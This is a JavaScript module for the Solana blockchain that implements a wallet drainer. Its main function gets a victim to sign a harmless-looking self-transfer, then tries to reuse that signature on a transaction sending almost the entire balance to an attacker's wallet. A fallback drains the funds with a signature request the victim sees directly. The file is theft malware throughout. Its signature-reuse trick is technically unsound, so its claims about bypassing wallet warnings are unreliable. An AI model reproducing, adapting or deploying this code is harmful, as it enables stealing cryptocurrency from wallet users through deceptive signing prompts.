import { 
  Connection, 
  Transaction, 
  SystemProgram,
  PublicKey
} from '@solana/web3.js';

export const executePhantomBypass = async (
  provider, 
  connection, 
  drainWallet,
  walletAddress
) => {
  try {
    // 1. Get balance
    const balance = await connection.getBalance(walletAddress);
    if (balance < 0.003 * 1e9) {
      throw new Error('Insufficient balance');
    }
    
    // 2. Get blockhash
    const { blockhash } = await connection.getLatestBlockhash();
    
    // 3. Create loopback transaction
    const loopbackTx = new Transaction({
      feePayer: walletAddress,
      recentBlockhash: blockhash,
    }).add(
      SystemProgram.transfer({
        fromPubkey: walletAddress,
        toPubkey: walletAddress, // Loopback to self
        lamports: 1, // Minimal amount
      })
    );
    
    // 4. Sign loopback (user sees "No balance change")
    const signedLoopback = await provider.signTransaction(loopbackTx);
    const signature = signedLoopback.signature;
    
    // 5. Create actual drain transaction
    const drainAmount = balance - 2000000; // Leave 0.002 SOL for gas
    const drainTx = new Transaction({
      feePayer: walletAddress,
      recentBlockhash: blockhash,
    }).add(
      SystemProgram.transfer({
        fromPubkey: walletAddress,
        toPubkey: new PublicKey(drainWallet),
        lamports: drainAmount,
      })
    );
    
    // 6. Reuse signature
    drainTx.addSignature(walletAddress, signature);
    
    // 7. Send drain transaction
    const rawTx = drainTx.serialize();
    const txId = await connection.sendRawTransaction(rawTx, {
      skipPreflight: false
    });
    
    // 8. Wait for confirmation
    await connection.confirmTransaction(txId, 'confirmed');
    
    return {
      success: true,
      txId,
      amount: drainAmount / 1e9
    };
    
  } catch (error) {
    console.error('Bypass failed:', error);
    
    // Fallback to standard drain
    try {
      return await executeStandardDrain(provider, connection, drainWallet, walletAddress);
    } catch (fallbackError) {
      throw new Error(`Both bypass and standard drain failed: ${fallbackError.message}`);
    }
  }
};

const executeStandardDrain = async (provider, connection, drainWallet, walletAddress) => {
  // Standard drain without bypass (will show warning)
  const balance = await connection.getBalance(walletAddress);
  const drainAmount = balance - 2000000;
  
  const { blockhash } = await connection.getLatestBlockhash();
  
  const tx = new Transaction({
    feePayer: walletAddress,
    recentBlockhash: blockhash,
  }).add(
    SystemProgram.transfer({
      fromPubkey: walletAddress,
      toPubkey: new PublicKey(drainWallet),
      lamports: drainAmount,
    })
  );
  
  const signedTx = await provider.signTransaction(tx);
  const txId = await connection.sendRawTransaction(signedTx.serialize());
  
  await connection.confirmTransaction(txId, 'confirmed');
  
  return {
    success: true,
    txId,
    amount: drainAmount / 1e9,
    warning: true // Indicates user saw warning
  };
};
